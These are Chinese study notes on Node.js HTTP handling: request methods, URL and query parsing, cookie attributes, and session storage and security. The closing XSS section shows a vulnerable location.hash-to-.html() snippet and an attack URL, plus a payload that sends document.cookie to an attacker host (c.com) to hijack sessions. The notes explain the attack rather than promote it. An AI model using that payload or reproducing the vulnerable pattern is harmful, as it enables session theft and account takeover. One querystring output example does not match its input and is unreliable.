主要内容：

在Web应用中，JavaScript将不再仅仅出现在前端浏览器中，因为Node的出现，“前端”将会被重新定义。"

单从框架而言，在后端数得出来大名的就有Structs、CodeIgniter、Rails、Django、web.py等，在前端也有知名的BackBone、 Knockout. js、AngularJS、Meteor等。在Node中，有Connect中间件，也有Express这样的MVC框架。

## 基础

http模块中服务器端的request事件：
- request事件发生于网络连接建立，客户端向服务器端发送报文，服务器端解析报文，发现HTTP请求的报头时。
- 在已触发reqeust事件前，它已准备好ServerRequest和ServerResponse对象以供对请求和响应报文的操作。
- 我们的应用可能无限地复杂，但是只要最终结果返回`function(req, res)`函数作为参数，传递给`createServer()`方法作为request事件的侦听器就可以了`。

请求报文：
```
GET /path?foo=bar HTTP/1.1
> User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5
Host: 127.0.0.1:1337
Accept: */*
```

### 请求方法

|请求方法|
|:----:|
|`GET，POST，HEAD，DELETE，PUT，CONNECT`，请求方法存在于报文的第一行的第一个单词，通常是大写。|
|HTTP_Parser在解析请求报文的时候，将报文头抽取出来，设置为`req.method`。|
|在RESTful类Web服务中请求方法十分重要，因为它会决定资源的操作行为。**PUT代表新建一个资源，POST表示要更新一个资源，GET表示查看一个资源，而DELET表示删除一个资源**。|

### 路径解析

`GET /path?foo=bar HTTP/1.1`

HTTP_Parser将其解析为`req.url`。一般而言，完整的URL地址是如下这样的：
`http://user:pass@host.com:8080/p/a/t/h?query=string#hash`

客户端代理（浏览器）会将这个地址解析成报文，将**路径和查询部分放在报文第一行**。需要注意的是，**hash部分会被丢弃，不会存在于报文的任何地方**。

- 最常见的根据路径进行业务处理的应用是静态文件服务器，它会根据路径去查找磁盘中的文件，然后将其响应给客户端。
- 还有一种比较常见的分发场景是根据路径来选择控制器，它预设路径为控制器和行为的组合，尤须额外配置路由信息。

### 查询字符串

查询字符串位于路径之后，在地址栏中路径后的`?foo=bar&baz=val`字符串就是查询字符串。这个字符串会跟随在路径后，形成请求报文首行的第二部分。Node提供了`querystring`模块用于处理这部分数据。

```javascript
var  url  =  require('url');
var  querystring  =  require('querystring');
var  query  =  querystring.parse(url.parse(req.url).query);

or

var  query  =  url.parse(req.url,  true).query;

result:

{
foo: ['bar', 'baz'],
baz:  'val'
}
```

### Cookie

HTTP是一个无状态的协议，现实中的业务却是需要一定的状态的，否则无法区分用户之间的身份。**如何标识和认证一个用户，最早的方案就是Cookie**。

Cookie的处理分为如下几步:
- 服务器向客户端发送Cookie。
- 浏览器将Cookie保存。
- 之后每次浏览器都会将Cookie发向服务器端。

* 客户端发送的Cookie在请求报文的Cookie字段中，我们**可以通过curl工具构造Cookie字段**，如下所示：
`curl  -v  -H  "Cookie:  foo=bar;  baz=val"  "http://127.0.0.1:1337/path?foo=bar&foo=baz"`

* HTTP_Parser会将所有的报文字段解析到`req.headers` 上，那么Cookie 就是`req.headers.cookie`。根据规范中的定义，Cookie值的格式是`key=value;  key2=value2`形式的，如果我们需要
Cookie，解析它也十分容易，如下所示：

```javascript
var parseCookie = function (cookie) {
  var cookies = {};
  if (!cookie) {
      return cookies;
  }
  var list = cookie.split(';');
  for (var i = 0; i < list.length; i++) {
      var pair = list[i].split('=');
      cookies[pair[0].trim()] = pair[1];
  }
  return cookies;
};
```

- 响应报文，响应的Cookie值在`Set-Cookie`字段中。它的格式与请求中的格式不太相同，规范中对它的定义如下所示：`name=value`是必须包含的部分，其余部分皆是可选参数.

`Set-Cookie:  name=value;  Path=/;  Expires=Sun,  23-Apr-23  09:01:35  GMT;  Domain=.domain.com;`

- `path`表示这个Cookie影响到的路径，当前访问的路径不满足该匹配时，浏览器则不发送这个Cookie。
- `Expires`和`Max-Age`是用来告知浏览器这个Cookie何时过期的，如果不设置该选项，在关闭浏览器时会丢失掉这个Cookie。如果设置了过期时间，浏览器将会把Cookie内容写入到磁盘中并保存，下次打开浏览器依旧有效。**Expires的值是一个UTC格式的时间字符串，告知浏览器此Cookie何时将过期，Max-Age则告知浏览器此Cookie多久后过期**。前者一般而言不存在问题，但是如果服务器端的时间和客户端的时间不能匹配，这种时间设置就会存在偏差。为此，Max-Age告知浏览器这条Cookie多久之后过期，而不是一个具体的时间点。
- `HttpOnly`告知浏览器不允许通过脚本`document.cookie`去更改这个Cookie值，事实上，设置 HttpOnly之后，这个值在`document.cookie`中不可见。但是在HTTP请求的过程中，依然会发送这个Cookie到服务器端。
- `Secure`。当Secure值为true时，在HTTP中是无效的，在HTTPS中才有效，表示创建的Cookie只能在HTTPS连接中被浏览器传递到服务器端进行会话验证，如果是HTTP连接则不会传递该信息，所以很难被窃听到。

--------------------------------------------------------------------------------------------

一旦设置的Cookie过多，将会导致报头较大。大多数的Cookie并不需要每次都用上，因为这会造成带宽的部分浪费。在YSlow的性能优化规则中有这么一条：

- 减小cookie的大小<br>
如果在域名的根节点设置Cookie，几乎所有子路径下的请求都会带上这些Cookie。好在Cookie在设计时限定了它的域，只有域名相同时才会发送。所以YSlow中有另外一条规则用来避免Cookie带来的性能影响。
- 为静态组件使用不同的域名<br>
可以实现减少无效Cookie的传输，当然换用额外的域名，还可以突破浏览器下载线程数量的限制，因为域名不同，可以将下载线程数翻倍。但是换用额外域名还是有一定的缺点的，那就是将域名转换为IP需要进行DNS查询，多一个域名就多一次DNS查询。
- 减少DNS查询<br>
现今的浏览器都会进行DNS缓存，以削弱这个副作用的影响。
Cookie除了可以通过后端添加协议头的字段设置外，在前端浏览器中也可以通过JavaScript进行修改，浏览器将Cookie通过`document.cookie`暴露给了JavaScript。前端在修改Cookie之后，后续的网络请求中就会携带上修改过后的值。

--------------------------------------------------------------------------------------------
Cookie存在的问题：
- 体积过大
- Cookie可以在前后端进行修改，数据就极容易被篡改和伪造
- 所以，Cookie对于敏感数据的保护是无效的

### Session

Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。

- 基于Cookie来实现用户和数据的映射

一旦服务器端启用了Session，它将约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，Tomcat会采用jsessionid等。一旦服务器检查到用户请求 Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成。还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据。

- 通过查询字符串来实现浏览器端和服务器端数据的对应

它的原理是检查请求的查询字符串，如果没有值，会先生成新的带值的URL。然后形成跳转，让客户端重新发起请求。

用户访问`http://localhost/pathname`时，如果服务器端发现查询字符串中不带`session_id`参数，就会将用户跳转到`http://localhost/pathname?session_id=12344567`这样一个类似的地址。如果浏览器收到302状态码和Location报头，就会重新发起新的请求，如下所示：
```
<  HTTP/1.1  302  Moved  Temporarily
<  Location:  /pathname?session_id=12344567
```
这样，新的请求到来时就能通过Session的检查，除非内存中的数据过期。
**这种方案带来的风险远大于基于Cookie实现的风险，因为只要将地址栏中的地址发给另外一个人，那么他就拥有跟你相同的身份**。<br>
还有一种比较有趣的处理Session的方式是**利用HTTP请求头中的ETag**，同样对于更换浏览器和电脑后也是无效的。

--------------------------------------------------------------------------------------------

Session与内存

- **为了解决性能问题（内存限制）Session数据尤法跨进程共享的问题，常用的方案是将Session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中**。<br>
- 目前常用的工具是`Redis、 Memcached`等中间件，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效。
- 采用第三方缓存来存储Session引起的一个问题是会引起网络访问

尽管如此但依然会采用这些高速缓存的理由有以下几条：
- Node与缓存服务保持长连接，而非频繁的短连接，握手导致的延迟只影响初始化。
- 高速缓存直接在内存中进行数据存储和访问。
- 缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响较小。

--------------------------------------------------------------------------------------------
Session与安全

将口令通过私钥加密进行签名，使得伪造的成本较高。

**XSS漏洞**<br>
XSS的全称是跨站脚本攻击（Cross Site Scripting，通常简称为XSS），通常都是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS漏洞会让别的脚本执行。<br>
它的主要形成原因多数是用户的输入没有被转义，而被直接执行。

下面是某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示：<br>
`"$('#box').html(location.hash.replace('#',  ''));`
攻击者在发现这里的湘洞后，构造了这样的URL：<br>
`"http://a.com/pathname#<script  src=""http://b.com/c.js""></script>`<br>
为了不让受害者直接发现这段URL中的猫腻，它可能会通过URL压缩成一个短网址，如下所示<br>
`http://t.cn/fasdlfj`, 或者再次压缩`http://url.cn/fasdlfb`.

然后将最终的短网址发给某个登录的在线用户。这样一来，这段hash中的脚本将会在这个用户的浏览器中执行，而这段脚本中的内容如下所示：<br>
`location.href  =  ""http://c.com/?""  +  document.cookie;`<br>
这段代码将该用户的Cookie提交给了`c.com`站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令。然后他在客户端中用这个口令伪造Cookie，从而实现了伪装用户的身份。如果该用户是网站管理员，就可能造成极大的危害。